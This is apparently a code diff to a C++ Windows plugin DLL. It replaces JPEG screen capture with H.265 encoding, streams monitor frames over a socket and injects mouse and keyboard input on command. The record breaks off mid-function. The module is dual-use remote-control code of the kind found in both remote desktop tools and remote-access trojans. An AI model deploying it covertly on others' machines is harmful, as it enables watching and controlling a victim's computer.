@@ -2,7 +2,6 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <propidl.h>
-#include <gdiplus.h>
 #include <objidl.h>
 #include <algorithm>
 #include <atomic>
@@ -12,17 +11,30 @@
 #include <string>
 #include <thread>
 #include <vector>
+
+#include <mfapi.h>
+#include <mfidl.h>
+#include <mftransform.h>
+#include <mferror.h>
+#include <wmcodecdsp.h>
+
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "mfplat.lib")
+#pragma comment(lib, "mfuuid.lib")
+#pragma comment(lib, "wmcodecdspuuid.lib")
 
 using json = nlohmann::json;
-using namespace Gdiplus;
 using namespace std;
+
+// GUIDs
+// MFVideoFormat_HEVC: {35363248-0000-0010-8000-00AA00389B71}
+static const GUID CLSID_CMSH265EncoderMFT = { 0x2c417f4d, 0x194d, 0x47e1, { 0xb2, 0x01, 0x3d, 0xb8, 0x48, 0x3a, 0x7c, 0x98 } };
+static const GUID MyMFVideoFormat_HEVC = { 0x35363248, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
 
 struct MonitorData {
     RECT rect{};
@@ -51,7 +63,7 @@ struct MonitorFrameHeader {
 
 static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;
-static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;
+static const uint32_t MONITOR_FRAME_FORMAT_H265 = 3;
 
 static atomic_bool g_captureRunning(false);
 static thread g_captureThread;
@@ -64,21 +76,155 @@ static int g_targetFps = 20;
 static RECT g_captureRect{};
 static bool g_hasCaptureRect = false;
 
-static mutex g_gdiplusMutex;
-static ULONG_PTR g_gdiplusToken = 0;
+class H265Encoder {
+    IMFTransform* m_pTransform = nullptr;
+    IMFMediaType* m_pInputType = nullptr;
+    IMFMediaType* m_pOutputType = nullptr;
+    DWORD m_inputStreamID = 0;
+    DWORD m_outputStreamID = 0;
+    int m_width = 0;
+    int m_height = 0;
+    bool m_initialized = false;
+
+public:
+    H265Encoder() {}
+    ~H265Encoder() { Shutdown(); }
+
+    bool Initialize(int width, int height, int fps) {
+        Shutdown();
+        m_width = (width + 1) & ~1;
+        m_height = (height + 1) & ~1;
+
+        HRESULT hr = CoCreateInstance(CLSID_CMSH265EncoderMFT, NULL, CLSCTX_INPROC_SERVER, IID_IMFTransform, (void**)&m_pTransform);
+        if (FAILED(hr)) return false;
+
+        hr = MFCreateMediaType(&m_pOutputType);
+        if (FAILED(hr)) return false;
+        m_pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
+        m_pOutputType->SetGUID(MF_MT_SUBTYPE, MyMFVideoFormat_HEVC);
+        m_pOutputType->SetUINT32(MF_MT_AVG_BITRATE, 1000000); // 1 Mbps fallback
+        MFSetAttributeSize(m_pOutputType, MF_MT_FRAME_SIZE, m_width, m_height);
+        MFSetAttributeRatio(m_pOutputType, MF_MT_FRAME_RATE, fps, 1);
+        m_pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
+
+        hr = m_pTransform->SetOutputType(m_outputStreamID, m_pOutputType, 0);
+        if (FAILED(hr)) return false;
+
+        hr = MFCreateMediaType(&m_pInputType);
+        if (FAILED(hr)) return false;
+        m_pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
+        m_pInputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
+        MFSetAttributeSize(m_pInputType, MF_MT_FRAME_SIZE, m_width, m_height);
+        MFSetAttributeRatio(m_pInputType, MF_MT_FRAME_RATE, fps, 1);
+        m_pInputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
+
+        hr = m_pTransform->SetInputType(m_inputStreamID, m_pInputType, 0);
+        if (FAILED(hr)) return false;
+
+        hr = m_pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
+        hr = m_pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);
+
+        m_initialized = true;
+        return true;
+    }
+
+    void Shutdown() {
+        if (m_pTransform) {
+            m_pTransform->ProcessMessage(MFT_MESSAGE_NOTIFY_END_STREAMING, 0);
+            m_pTransform->Release();
+            m_pTransform = nullptr;
+        }
+        if (m_pInputType) { m_pInputType->Release(); m_pInputType = nullptr; }
+        if (m_pOutputType) { m_pOutputType->Release(); m_pOutputType = nullptr; }
+        m_initialized = false;
+    }
+
+    bool Encode(const vector<uint8_t>& nv12Data, vector<uint8_t>& output) {
+        if (!m_initialized) return false;
+
+        IMFSample* pSample = nullptr;
+        IMFMediaBuffer* pBuffer = nullptr;
+        HRESULT hr = MFCreateSample(&pSample);
+        if (FAILED(hr)) return false;
+
+        hr = MFCreateMemoryBuffer((DWORD)nv12Data.size(), &pBuffer);
+        if (FAILED(hr)) { pSample->Release(); return false; }
+
+        BYTE* pData = nullptr;
+        hr = pBuffer->Lock(&pData, NULL, NULL);
+        if (SUCCEEDED(hr)) {
+            memcpy(pData, nv12Data.data(), nv12Data.size());
+            pBuffer->Unlock();
+            pBuffer->SetCurrentLength((DWORD)nv12Data.size());
+        }
+        pSample->AddBuffer(pBuffer);
+        pBuffer->Release();
+
+        hr = m_pTransform->ProcessInput(m_inputStreamID, pSample, 0);
+        pSample->Release();
+        if (FAILED(hr)) return false;
+
+        MFT_OUTPUT_DATA_BUFFER outputDataBuffer = { 0 };
+        outputDataBuffer.dwStreamID = m_outputStreamID;
+
+        DWORD status = 0;
+        hr = m_pTransform->ProcessOutput(0, 1, &outputDataBuffer, &status);
+        if (hr == MF_E_TRANSFORM_NEED_MORE_INPUT) return false;
+        if (FAILED(hr)) return false;
+
+        if (outputDataBuffer.pSample) {
+            IMFMediaBuffer* pOutBuffer = nullptr;
+            hr = outputDataBuffer.pSample->ConvertToContiguousBuffer(&pOutBuffer);
+            if (SUCCEEDED(hr)) {
+                BYTE* pOutData = nullptr;
+                DWORD outLen = 0;
+                hr = pOutBuffer->Lock(&pOutData, NULL, &outLen);
+                if (SUCCEEDED(hr)) {
+                    output.assign(pOutData, pOutData + outLen);
+                    pOutBuffer->Unlock();
+                }
+                pOutBuffer->Release();
+            }
+            outputDataBuffer.pSample->Release();
+        }
+        if (outputDataBuffer.pEvents) outputDataBuffer.pEvents->Release();
+
+        return !output.empty();
+    }
+};
+
+static void BGRXToNV12(int width, int height, const uint8_t* bgrx, uint8_t* nv12) {
+    int y_size = width * height;
+    uint8_t* y_plane = nv12;
+    uint8_t* uv_plane = nv12 + y_size;
+
+    for (int y = 0; y < height; y++) {
+        for (int x = 0; x < width; x++) {
+            const uint8_t* p = bgrx + (y * width + x) * 4;
+            uint8_t B = p[0];
+            uint8_t G = p[1];
+            uint8_t R = p[2];
+
+            y_plane[y * width + x] = (uint8_t)(((66 * R + 129 * G + 25 * B + 128) >> 8) + 16);
+
+            if (y % 2 == 0 && x % 2 == 0) {
+                int uv_idx = (y / 2) * width + x;
+                uv_plane[uv_idx] = (uint8_t)(((112 * R - 94 * G - 18 * B + 128) >> 8) + 128);   // U
+                uv_plane[uv_idx + 1] = (uint8_t)(((-38 * R - 74 * G + 112 * B + 128) >> 8) + 128); // V
+            }
+        }
+    }
+}
 
 static bool safe_send_raw(SOCKET sock, const string& data) {
     const char* ptr = data.c_str();
     int remaining = (int)data.size();
-
     while (remaining > 0) {
         int sent = send(sock, ptr, remaining, 0);
-        if (sent == SOCKET_ERROR || sent <= 0)
-            return false;
+        if (sent == SOCKET_ERROR || sent <= 0) return false;
         ptr += sent;
         remaining -= sent;
     }
-
     return true;
 }
 
@@ -88,36 +234,25 @@ static bool safe_send_json(SOCKET sock, const json& data) {
     return safe_send_raw(sock, serialized + "\r\n");
 }
 
-static bool safe_send_monitor_frame(SOCKET sock,
-                                    int monitor,
-                                    int scale,
-                                    int fps,
-                                    int width,
-                                    int height,
-                                    const vector<unsigned char>& jpegBytes) {
-    if (jpegBytes.empty())
-        return false;
-
+static bool safe_send_monitor_frame(SOCKET sock, int monitor, int scale, int fps, int width, int height, const vector<unsigned char>& data) {
+    if (data.empty()) return false;
     MonitorFrameHeader frameHeader{};
     frameHeader.monitor = (uint32_t)max(0, monitor);
     frameHeader.scale = (uint32_t)max(0, scale);
     frameHeader.fps = (uint32_t)max(0, fps);
     frameHeader.width = (uint32_t)max(0, width);
     frameHeader.height = (uint32_t)max(0, height);
-    frameHeader.format = MONITOR_FRAME_FORMAT_JPEG;
-    frameHeader.dataSize = (uint32_t)jpegBytes.size();
-
+    frameHeader.format = MONITOR_FRAME_FORMAT_H265;
+    frameHeader.dataSize = (uint32_t)data.size();
     PacketHeader packetHeader{};
     packetHeader.signature = PACKET_SIGNATURE;
     packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
-    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + jpegBytes.size());
-
+    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + data.size());
     string packet;
     packet.resize(sizeof(PacketHeader) + packetHeader.size);
     memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
     memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
-    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], jpegBytes.data(), jpegBytes.size());
-
+    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], data.data(), data.size());
     lock_guard<mutex> lock(g_sendMutex);
     return safe_send_raw(sock, packet);
 }
@@ -129,48 +264,26 @@ static void send_monitor_error(SOCKET sock, const string& message) {
     safe_send_json(sock, response);
 }
 
-static string wide_to_utf8(const wchar_t* value) {
-    if (!value || value[0] == L'\0')
-        return "";
-
-    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
-    if (size <= 1)
-        return "";
-
-    string result(size - 1, '\0');
-    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
-    return result;
-}
-
 static string get_display_name(const char* deviceName) {
-    if (!deviceName || deviceName[0] == '\0')
-        return "";
-
+    if (!deviceName || deviceName[0] == '\0') return "";
     DISPLAY_DEVICEA displayDevice{};
     displayDevice.cb = sizeof(displayDevice);
     if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
         return string(displayDevice.DeviceString);
-
     return "";
 }
 
 static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
     vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);
-
     MONITORINFOEXA info{};
     info.cbSize = sizeof(info);
-    if (!GetMonitorInfoA(monitor, &info))
-        return TRUE;
-
+    if (!GetMonitorInfoA(monitor, &info)) return TRUE;
     MonitorData item;
     item.rect = info.rcMonitor;
     item.deviceName = info.szDevice;
     item.displayName = get_display_name(info.szDevice);
     item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;
-
-    if (item.displayName.empty())
-        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;
-
+    if (item.displayName.empty()) item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;
     monitors->push_back(item);
     return TRUE;
 }
@@ -178,7 +291,6 @@ static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM use
 static vector<MonitorData> enumerate_monitors() {
     vector<MonitorData> monitors;
     EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));
-
     if (monitors.empty()) {
         MonitorData fallback;
         fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -189,7 +301,6 @@ static vector<MonitorData> enumerate_monitors() {
         fallback.primary = true;
         monitors.push_back(fallback);
     }
-
     return monitors;
 }
 
@@ -198,463 +309,174 @@ static void send_monitor_list(SOCKET sock) {
     json response;
     response["action"] = "monitorlistresponse";
     response["monitors"] = json::array();
-
     for (size_t i = 0; i < monitors.size(); ++i) {
         const MonitorData& monitor = monitors[i];
         int width = monitor.rect.right - monitor.rect.left;
         int height = monitor.rect.bottom - monitor.rect.top;
-
         string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
-        if (monitor.primary)
-            name += " (Primary)";
-
+        if (monitor.primary) name += " (Primary)";
         response["monitors"].push_back({
-            {"index", (int)i},
-            {"name", name},
-            {"device", monitor.deviceName},
-            {"left", monitor.rect.left},
-            {"top", monitor.rect.top},
-            {"width", width},
-            {"height", height},
-            {"primary", monitor.primary}
+            {"index", (int)i}, {"name", name}, {"device", monitor.deviceName},
+            {"left", monitor.rect.left}, {"top", monitor.rect.top},
+            {"width", width}, {"height", height}, {"primary", monitor.primary}
         });
     }
-
     safe_send_json(sock, response);
-}
-
-static bool ensure_gdiplus() {
-    lock_guard<mutex> lock(g_gdiplusMutex);
-    if (g_gdiplusToken != 0)
-        return true;
-
-    GdiplusStartupInput input;
-    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
-}
-
-static void shutdown_gdiplus() {
-    lock_guard<mutex> lock(g_gdiplusMutex);
-    if (g_gdiplusToken != 0) {
-        GdiplusShutdown(g_gdiplusToken);
-        g_gdiplusToken = 0;
-    }
-}
-
-static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
-    UINT count = 0;
-    UINT size = 0;
-
-    GetImageEncodersSize(&count, &size);
-    if (size == 0)
-        return -1;
-
-    vector<unsigned char> buffer(size);
-    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
-    if (GetImageEncoders(count, size, codecs) != Ok)
-        return -1;
-
-    for (UINT i = 0; i < count; ++i) {
-        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
-            *clsid = codecs[i].Clsid;
-            return (int)i;
-        }
-    }
-
-    return -1;
-}
-
-static DWORD now_ms() {
-    return GetTickCount();
 }
 
 static int clamp_int(int value, int minValue, int maxValue) {
     return max(minValue, min(value, maxValue));
 }
 
-static int automatic_fps_for_scale(int scalePercent) {
-    if (scalePercent >= 90) return 20;
-    if (scalePercent >= 70) return 22;
-    if (scalePercent >= 50) return 24;
-    return 25;
-}
+static bool capture_monitor_pixels(const RECT& rect, int scalePercent, vector<uint8_t>& bgrx, int& outW, int& outH, string& error) {
+    int sw = rect.right - rect.left;
+    int sh = rect.bottom - rect.top;
+    outW = (sw * scalePercent) / 100;
+    outH = (sh * scalePercent) / 100;
+    outW = (outW + 1) & ~1;
+    outH = (outH + 1) & ~1;
 
-static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
-    int pixels = max(1, width * height);
+    HDC sDC = GetDC(NULL);
+    HDC mDC = CreateCompatibleDC(sDC);
+    HBITMAP bmp = CreateCompatibleBitmap(sDC, outW, outH);
+    HGDIOBJ old = SelectObject(mDC, bmp);
+    SetStretchBltMode(mDC, COLORONCOLOR);
+    StretchBlt(mDC, 0, 0, outW, outH, sDC, rect.left, rect.top, sw, sh, SRCCOPY | CAPTUREBLT);
 
-    if (scalePercent >= 90 || pixels >= 2500000) return 30;
-    if (scalePercent >= 70 || pixels >= 1600000) return 36;
-    if (scalePercent >= 50 || pixels >= 900000) return 44;
-    return 52;
-}
+    BITMAPINFO bmi = { 0 };
+    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth = outW;
+    bmi.bmiHeader.biHeight = -outH;
+    bmi.bmiHeader.biPlanes = 1;
+    bmi.bmiHeader.biBitCount = 32;
+    bmi.bmiHeader.biCompression = BI_RGB;
 
-static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
-    bytes.clear();
+    bgrx.resize(outW * outH * 4);
+    GetDIBits(mDC, bmp, 0, outH, bgrx.data(), &bmi, DIB_RGB_COLORS);
 
-    if (!ensure_gdiplus()) {
-        error = "GDI+ could not be started";
-        return false;
-    }
-
-    CLSID jpegClsid;
-    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
-        error = "JPEG encoder not found";
-        return false;
-    }
-
-    Bitmap bitmap(bitmapHandle, NULL);
-    if (bitmap.GetLastStatus() != Ok) {
-        error = "Bitmap conversion failed";
-        return false;
-    }
-
-    IStream* stream = NULL;
-    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
-        error = "Memory stream could not be created";
-        return false;
-    }
-
-    EncoderParameters params{};
-    params.Count = 1;
-    params.Parameter[0].Guid = EncoderQuality;
-    params.Parameter[0].Type = EncoderParameterValueTypeLong;
-    params.Parameter[0].NumberOfValues = 1;
-    params.Parameter[0].Value = &quality;
-
-    Status status = bitmap.Save(stream, &jpegClsid, &params);
-    if (status != Ok) {
-        stream->Release();
-        error = "JPEG encoding failed";
-        return false;
-    }
-
-    STATSTG stat{};
-    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
-        stream->Release();
-        error = "Encoded image size could not be read";
-        return false;
-    }
-
-    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
-        stream->Release();
-        error = "Encoded image is too large";
-        return false;
-    }
-
-    LARGE_INTEGER seekPos{};
-    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);
-
-    bytes.resize((size_t)stat.cbSize.QuadPart);
-    ULONG readBytes = 0;
-    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
-    stream->Release();
-
-    if (readResult != S_OK || readBytes != bytes.size()) {
-        error = "Encoded image could not be read";
-        bytes.clear();
-        return false;
-    }
-
+    SelectObject(mDC, old);
+    DeleteObject(bmp);
+    DeleteDC(mDC);
+    ReleaseDC(NULL, sDC);
     return true;
-}
-
-static bool capture_monitor_frame(const RECT& rect,
-                                  int scalePercent,
-                                  vector<unsigned char>& jpegBytes,
-                                  int& outputWidth,
-                                  int& outputHeight,
-                                  string& error) {
-    scalePercent = max(10, min(scalePercent, 100));
-
-    int sourceWidth = rect.right - rect.left;
-    int sourceHeight = rect.bottom - rect.top;
-    if (sourceWidth <= 0 || sourceHeight <= 0) {
-        error = "Invalid monitor dimensions";
-        return false;
-    }
-
-    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
-    outputHeight = max(1, (sourceHeight * scalePercent) / 100);
-    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);
-
-    HDC screenDC = GetDC(NULL);
-    if (!screenDC) {
-        error = "Screen device context could not be opened";
-        return false;
-    }
-
-    HDC memoryDC = CreateCompatibleDC(screenDC);
-    if (!memoryDC) {
-        ReleaseDC(NULL, screenDC);
-        error = "Memory device context could not be created";
-        return false;
-    }
-
-    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
-    if (!bitmap) {
-        DeleteDC(memoryDC);
-        ReleaseDC(NULL, screenDC);
-        error = "Capture bitmap could not be created";
-        return false;
-    }
-
-    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
-    SetStretchBltMode(memoryDC, COLORONCOLOR);
-
-    BOOL copied = StretchBlt(
-        memoryDC,
-        0,
-        0,
-        outputWidth,
-        outputHeight,
-        screenDC,
-        rect.left,
-        rect.top,
-        sourceWidth,
-        sourceHeight,
-        SRCCOPY | CAPTUREBLT
-    );
-
-    SelectObject(memoryDC, oldObject);
-    DeleteDC(memoryDC);
-    ReleaseDC(NULL, screenDC);
-
-    if (!copied) {
-        DeleteObject(bitmap);
-        error = "Screen capture failed";
-        return false;
-    }
-
-    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
-    DeleteObject(bitmap);
-    return encoded;
 }
 
 static void capture_loop() {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
+    H265Encoder encoder;
+    int curW = 0, curH = 0;
 
     while (g_captureRunning.load()) {
-        DWORD frameStart = now_ms();
-        SOCKET sock = INVALID_SOCKET;
-        int monitor = 0;
-        int scale = 50;
-        int targetFps = 20;
-        RECT captureRect{};
-        bool hasCaptureRect = false;
-
+        DWORD start = GetTickCount();
+        SOCKET sock; int monitor, scale, fps; RECT rect; bool has;
         {
             lock_guard<mutex> lock(g_captureMutex);
-            sock = g_captureSocket;
-            monitor = g_monitorIndex;
-            scale = g_scalePercent;
-            targetFps = g_targetFps;
-            captureRect = g_captureRect;
-            hasCaptureRect = g_hasCaptureRect;
+            sock = g_captureSocket; monitor = g_monitorIndex; scale = g_scalePercent;
+            fps = g_targetFps; rect = g_captureRect; has = g_hasCaptureRect;
         }
+        if (!has) { g_captureRunning.store(false); break; }
 
-        if (!hasCaptureRect) {
-            send_monitor_error(sock, "Capture monitor is not ready");
-            g_captureRunning.store(false);
-            break;
-        }
-
-        vector<unsigned char> jpegBytes;
-        int width = 0;
-        int height = 0;
-        string error;
-
-        if (capture_monitor_frame(captureRect, scale, jpegBytes, width, height, error)) {
-            if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, jpegBytes)) {
-                g_captureRunning.store(false);
-                break;
+        vector<uint8_t> bgrx, nv12, h265;
+        int w, h; string err;
+        if (capture_monitor_pixels(rect, scale, bgrx, w, h, err)) {
+            if (w != curW || h != curH) {
+                encoder.Initialize(w, h, fps);
+                curW = w; curH = h;
             }
-        } else {
-            send_monitor_error(sock, error.empty() ? "Capture failed" : error);
-            g_captureRunning.store(false);
-            break;
+            nv12.resize(w * h * 3 / 2);
+            BGRXToNV12(w, h, bgrx.data(), nv12.data());
+            if (encoder.Encode(nv12, h265)) {
+                if (!safe_send_monitor_frame(sock, monitor, scale, fps, w, h, h265)) {
+                    g_captureRunning.store(false); break;
+                }
+            }
         }
-
-        DWORD elapsed = now_ms() - frameStart;
-        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
-        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);
-
-        while (waitMs > 0 && g_captureRunning.load()) {
-            DWORD chunk = min<DWORD>(waitMs, 20);
-            Sleep(chunk);
-            waitMs -= chunk;
-        }
+        DWORD elapsed = GetTickCount() - start;
+        DWORD interval = 1000 / clamp_int(fps, 1, 60);
+        if (elapsed < interval) Sleep(interval - elapsed);
     }
 }
 
 static void stop_capture_thread() {
     g_captureRunning.store(false);
-
     if (g_captureThread.joinable()) {
-        if (g_captureThread.get_id() == this_thread::get_id())
-            g_captureThread.detach();
-        else
-            g_captureThread.join();
+        if (g_captureThread.get_id() == this_thread::get_id()) g_captureThread.detach();
+        else g_captureThread.join();
     }
-
     lock_guard<mutex> lock(g_captureMutex);
     g_hasCaptureRect = false;
 }
 
 static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps) {
     scalePercent = clamp_int(scalePercent, 10, 100);
-    int targetFps = requestedFps > 0
-        ? clamp_int(requestedFps, 20, 30)
-        : automatic_fps_for_scale(scalePercent);
-
+    int fps = requestedFps > 0 ? clamp_int(requestedFps, 1, 60) : 25;
     vector<MonitorData> monitors = enumerate_monitors();
-    if (monitors.empty()) {
-        send_monitor_error(sock, "No monitors found");
-        return;
-    }
-
-    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);
-
+    if (monitors.empty()) { send_monitor_error(sock, "No monitors"); return; }
+    int idx = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);
     {
         lock_guard<mutex> lock(g_captureMutex);
-        g_captureSocket = sock;
-        g_monitorIndex = safeMonitorIndex;
-        g_scalePercent = scalePercent;
-        g_targetFps = targetFps;
-        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
-        g_hasCaptureRect = true;
+        g_captureSocket = sock; g_monitorIndex = idx; g_scalePercent = scalePercent;
+        g_targetFps = fps; g_captureRect = monitors[idx].rect; g_hasCaptureRect = true;
     }
-
     if (!g_captureRunning.exchange(true)) {
-        if (g_captureThread.joinable())
-            g_captureThread.join();
+        if (g_captureThread.joinable()) g_captureThread.join();
         g_captureThread = thread(capture_loop);
     }
-
-    json response;
-    response["action"] = "monitorstatus";
-    response["status"] = "started";
-    response["monitor"] = safeMonitorIndex;
-    response["scale"] = scalePercent;
-    response["fps"] = targetFps;
-    safe_send_json(sock, response);
+    json res; res["action"] = "monitorstatus"; res["status"] = "started";
+    res["monitor"] = idx; res["scale"] = scalePercent; res["fps"] = fps;
+    res["codec"] = "h265";
+    safe_send_json(sock, res);
 }
 
 static void simulate_mouse(const string& event, int button, int x, int y) {
     RECT rect{};
-    {
-        lock_guard<mutex> lock(g_captureMutex);
-        if (!g_hasCaptureRect) return;
-        rect = g_captureRect;
-    }
-
-    // Normalized (0-65535) to Screen Absolute
-    // x_abs = rect.left + (x * (rect.right - rect.left) / 65535)
-    // SendInput uses MOUSEEVENTF_ABSOLUTE which maps 0-65535 to the virtual screen.
-
-    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
-    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);
-
-    // Map screen coordinate to MOUSEEVENTF_ABSOLUTE (0-65535 of virtual screen)
-    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-    if (v_width <= 0 || v_height <= 0) return;
-
-    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
-    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));
-
-    INPUT input = {0};
-    input.type = INPUT_MOUSE;
-    input.mi.dx = (LONG)fx;
-    input.mi.dy = (LONG)fy;
-    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
-
-    if (event == "move") {
-        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
-    } else if (event == "down") {
-        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
-        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
-        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
+    { lock_guard<mutex> lock(g_captureMutex); if (!g_hasCaptureRect) return; rect = g_captureRect; }
+    int sx = rect.left + MulDiv(x, rect.right - rect.left, 65535);
+    int sy = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);
+    int vl = GetSystemMetrics(SM_XVIRTUALSCREEN); int vt = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN); int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    if (vw <= 0 || vh <= 0) return;
+    INPUT in = { 0 }; in.type = INPUT_MOUSE;
+    in.mi.dx = (LONG)((sx - vl) * (65535.0 / (vw - 1)));
+    in.mi.dy = (LONG)((sy - vt) * (65535.0 / (vh - 1)));
+    in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
+    if (event == "move") in.mi.dwFlags |= MOUSEEVENTF_MOVE;
+    else if (event == "down") {
+        if (button == 0) in.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
+        else if (button == 1) in.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
+        else if (button == 2) in.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
     } else if (event == "up") {
-        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
-        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
-        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
+        if (button == 0) in.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
+        else if (button == 1) in.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
+        else if (button == 2) in.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
     }
-
-    SendInput(1, &input, sizeof(INPUT));
+    SendInput(1, &in, sizeof(INPUT));
 }
 
 static void simulate_key(const string& event, int vk) {
-    INPUT input = {0};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = (WORD)vk;
-    if (event == "up") {
-        input.ki.dwFlags = KEYEVENTF_KEYUP;
-    }
-    SendInput(1, &input, sizeof(INPUT));
+    INPUT in = { 0 }; in.type = INPUT_KEYBOARD; in.ki.wVk = (WORD)vk;
+    if (event == "up") in.ki.dwFlags = KEYEVENTF_KEYUP;
+    SendInput(1, &in, sizeof(INPUT));
 }
 
-extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
-    send_monitor_list(sock);
-}
-
-extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
+extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) { send_monitor_list(sock); }
+extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* jsonStr) {
     try {
-        json command = json::parse(commandJson ? commandJson : "{}");
-        string action = command.value("action", "");
-
-        if (action == "monitorlist") {
-            send_monitor_list(sock);
-            return;
-        }
-
-        if (action == "monitorstart") {
-            int monitor = command.value("monitor", 0);
-            int scale = command.value("scale", 50);
-            int fps = command.value("fps", 0);
-            start_capture(sock, monitor, scale, fps);
-            return;
-        }
-
-        if (action == "monitorstop") {
+        json cmd = json::parse(jsonStr ? jsonStr : "{}");
+        string act = cmd.value("action", "");
+        if (act == "monitorlist") send_monitor_list(sock);
+        else if (act == "monitorstart") start_capture(sock, cmd.value("monitor", 0), cmd.value("scale", 50), cmd.value("fps", 0));
